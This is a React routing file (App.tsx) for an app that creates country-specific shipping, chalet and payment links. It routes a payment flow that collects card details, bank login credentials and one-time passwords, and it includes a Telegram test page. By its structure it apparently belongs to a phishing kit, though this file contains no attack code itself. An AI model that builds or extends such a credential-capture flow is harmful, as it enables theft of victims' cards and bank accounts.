import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Services from "./pages/Services";
import CreateChaletLink from "./pages/CreateChaletLink";
import CreateShippingLink from "./pages/CreateShippingLink";
import CreatePaymentLink from "./pages/CreatePaymentLink";
import CreateInvoice from "./pages/CreateInvoice";
import InvoiceList from "./pages/InvoiceList";
import InvoiceView from "./pages/InvoiceView";
import InvoiceEdit from "./pages/InvoiceEdit";
import HealthServices from "./pages/HealthServices";
import LogisticsServices from "./pages/LogisticsServices";
import Contracts from "./pages/Contracts";
import Microsite from "./pages/Microsite";
import PaymentRecipient from "./pages/PaymentRecipient";
import PaymentDetails from "./pages/PaymentDetails";
import PaymentData from "./pages/PaymentData";
import PaymentBankSelector from "./pages/PaymentBankSelector";
import PaymentCardInput from "./pages/PaymentCardInput";
import PaymentBankLogin from "./pages/PaymentBankLogin";
import PaymentCardForm from "./pages/PaymentCardForm";
import PaymentCard from "./pages/PaymentCard";
import PaymentOTPForm from "./pages/PaymentOTPForm";
import PaymentOTP from "./pages/PaymentOTP";
import PaymentReceiptPage from "./pages/PaymentReceiptPage";
import PaymentReceipt from "./pages/PaymentReceipt";
import TelegramTestPage from "./pages/TelegramTestPage";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/services" element={<Services />} />
          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
          <Route path="/create/:country/payment" element={<CreatePaymentLink />} />
          <Route path="/invoices/create/:country" element={<CreateInvoice />} />
          <Route path="/invoices/list/:country" element={<InvoiceList />} />
          <Route path="/invoices/:id/view" element={<InvoiceView />} />
          <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
          <Route path="/health/:country" element={<HealthServices />} />
          <Route path="/logistics/:country" element={<LogisticsServices />} />
          <Route path="/contracts/:country" element={<Contracts />} />
          <Route path="/r/:country/:type/:id" element={<Microsite />} />
          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
          <Route path="/pay/:id/data" element={<PaymentData />} />
          <Route path="/pay/:id/details" element={<PaymentDetails />} />
          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
          <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
          {/* Payment routes with paymentId parameter */}
          <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
          <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
          <Route path="/pay/:id/receipt/:paymentId" element={<PaymentReceipt />} />
          {/* Legacy routes (kept for backwards compatibility) */}
          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
          <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
          <Route path="/telegram-test" element={<TelegramTestPage />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
